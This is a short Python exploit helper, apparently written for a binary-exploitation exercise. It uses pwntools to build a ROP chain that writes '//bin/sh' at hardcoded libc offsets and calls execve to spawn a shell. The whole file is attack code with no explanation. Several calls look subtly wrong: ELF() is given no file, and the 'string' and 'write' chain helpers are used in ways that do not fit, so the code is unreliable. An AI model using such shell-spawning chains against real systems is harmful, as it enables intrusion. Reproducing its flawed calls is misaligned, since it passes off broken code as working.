from pwn import *

def mkrop(pad, libc_base):
    libc = ELF()
    libc.address = libc_base
    
    rop = ROP(libc)
    rop.raw(pad)
    
    # Use pwntools string writing functionality
    binsh_addr = libc.address + 0x1be1a0
    rop.raw(rop.string(binsh_addr, b'//bin/sh'))
    
    # Write null terminator
    null_addr = libc.address + 0x1be1a8
    rop.raw(rop.write(null_addr, 0))
    
    # Set up and call execve
    rop.execve(binsh_addr, null_addr, null_addr)
    
    return rop.chain()